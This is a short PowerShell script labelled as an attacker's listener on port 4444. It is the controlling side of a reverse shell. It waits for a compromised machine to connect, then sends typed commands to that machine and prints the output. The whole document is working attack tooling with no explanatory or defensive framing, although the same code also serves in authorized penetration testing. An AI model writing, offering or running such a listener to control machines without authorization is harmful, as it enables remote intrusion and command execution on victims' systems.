# attacker's listener on 4444 

 $port = 4444
 $listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $port)
 $listener.Start()
Write-Host "[*] Listening on 0.0.0.0:$port..."

 $client = $listener.AcceptTcpClient()
Write-Host "[+] Connection from $($client.Client.RemoteEndPoint)"
 $listener.Stop()

 $stream = $client.GetStream()
 $writer = New-Object System.IO.StreamWriter($stream)
 $writer.AutoFlush = $true

 $buffer = New-Object byte[] 4096

while ($true) {
    Write-Host "shell> " -NoNewline
    $cmd = Read-Host
    
    if ($cmd -eq "exit") { break }
    if ([string]::IsNullOrWhiteSpace($cmd)) { continue }

    $payload = [System.Text.Encoding]::UTF8.GetBytes($cmd + "`n")
    $stream.Write($payload, 0, $payload.Length)

    Start-Sleep -Milliseconds 200

    while ($stream.DataAvailable) {
        $read = $stream.Read($buffer, 0, $buffer.Length)
        $output = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $read)
        Write-Host $output -NoNewline
    }
    Write-Host ""
}

 $writer.Close()
 $client.Close()
Write-Host "[*] Session closed."
